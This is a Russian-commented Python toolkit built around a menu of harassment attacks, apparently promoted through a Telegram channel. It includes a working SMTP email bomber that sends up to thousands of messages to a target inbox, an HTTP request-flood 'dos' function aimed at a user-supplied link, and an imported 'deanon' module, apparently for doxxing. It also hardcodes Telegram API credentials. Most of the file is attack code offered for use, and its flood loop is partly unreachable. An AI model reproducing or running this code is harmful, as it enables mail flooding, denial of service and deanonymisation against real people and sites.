# Импорты
import smtplib
import sys
import requests
import threading
# Переменные
api_id = '25401384'
api_hash = '90bda40107c47148760854310e27eef4'
dev = 'ProstoMobik' # Переменная для определения разработчика
ver = '1.0'
channel = ''
# Цвета
class bcolors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
# Цвета
green     = '\033[92m'
cyan      = '\033[95m'
bold      = '\033[1m'
underline = '\033[4m'
end       = '\033[0m'
red       = '\033[91m'
from pystyle import *
from permi import *
print(Colorate.Horizontal(Colors.cyan_to_green,Center.XCenter(banner)))
print('')
while True:
    select = input(f'{red}{underline}{bold}Выбор >{end} ')
    if select == '1':
        class Email_Bomber:
            count = 0

            def __init__(self):
                try:
                    print(bcolors.RED + '\n+[+[+[ Иницализируем программу. ]+]+]+')
                    self.target = str(input(bcolors.GREEN + 'Введите почту цели <: '))
                    self.mode = int(input(
                        bcolors.GREEN + 'Enter BOMB mode (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(custom) <: '))
                    if int(self.mode) > int(4) or int(self.mode) < int(1):
                        print('ERROR: Опция неправильна, пошел в пизду')
                        sys.exit(1)
                except Exception as e:
                    print(f'Ошибочка братан: {e}')

            def bomb(self):
                try:
                    print(bcolors.RED + '\n+[+[+[ Устанавилваем бомбу C4 в школе жертвы... ]+]+]+')
                    self.amount = None
                    if self.mode == int(1):
                        self.amount = int(1000)
                    elif self.mode == int(2):
                        self.amount = int(500)
                    elif self.mode == int(3):
                        self.amount = int(250)
                    else:
                        self.amount = int(input(bcolors.GREEN + 'Выберите сумму <: '))
                    print(
                        bcolors.RED + f'\n+[+[+[ Вы выбрали режим: {self.mode} and {self.amount} почт ]+]+]+')
                except Exception as e:
                    print(f'ERROR: {e}')

            def email(self):
                try:
                    print(bcolors.RED + '\n+[+[+[ Устанавливаем почту ]+]+]+')
                    self.server = str(input(
                        bcolors.GREEN + 'Введите сервер Email | или выберите опцию - 1:Gmail 2:Yahoo 3:Outlook <: '))
                    premade = ['1', '2', '3']
                    default_port = True
                    if self.server not in premade:
                        default_port = False
                        self.port = int(input(bcolors.GREEN + 'Enter port number <: '))

                    if default_port == True:
                        self.port = int(587)

                    if self.server == '1':
                        self.server = 'smtp.gmail.com'
                    elif self.server == '2':
                        self.server = 'smtp.mail.yahoo.com'
                    elif self.server == '3':
                        self.server = 'smtp-mail.outlook.com'

                    self.fromAddr = str(input(bcolors.GREEN + 'Введите адресс <: '))
                    self.fromPwd = str(input(bcolors.GREEN + 'Введите пароль <: '))
                    self.subject = str(input(bcolors.GREEN + 'Введите тему <: '))
                    self.message = str(input(bcolors.GREEN + 'Введите сообщение <: '))

                    self.msg = '''От: %s\nК: %s\nТема %s\n%s\n
                        ''' % (self.fromAddr, self.target, self.subject, self.message)

                    self.s = smtplib.SMTP(self.server, self.port)
                    self.s.ehlo()
                    self.s.starttls()
                    self.s.ehlo()
                    self.s.login(self.fromAddr, self.fromPwd)
                except Exception as e:
                    print(f'Ошибка: {e}')

            def send(self):
                try:
                    self.s.sendmail(self.fromAddr, self.target, self.msg)
                    self.count += 1
                    print(bcolors.YELLOW + f'Бомба: {self.count}')
                except Exception as e:
                    print(f'ERROR: {e}')

            def attack(self):
                print(bcolors.RED + '\n+[+[+[ Атакуем... ]+]+]+')
                for email in range(self.amount + 1):
                    self.send()
                self.s.close()
                print(bcolors.RED + '\n+[+[+[ Атака завершена ]+]+]+')


        if __name__ == '__main__':
            bomb = Email_Bomber()
            bomb.bomb()
            bomb.email()
            bomb.attack()
    if select == '2':
        print(f'{red}ERROR:\nДанная функция находится в разработке!\nЗа обновлениями следи в канале:\nt.me/DOO_TER')
    if select == '3':
        from deanon import get_card
        get_card()
    if select == '4':
        doslink = input(f'{green}{underline}{bold}Введите ссылку:{end} ')
        print(f'{green}Вы ввели: {doslink}{end}!')
        def dos():
            while True:
                requests.get(doslink)
            while True:
                threading.Thread(target=dos).start()
    if select == '99':
        exit(777)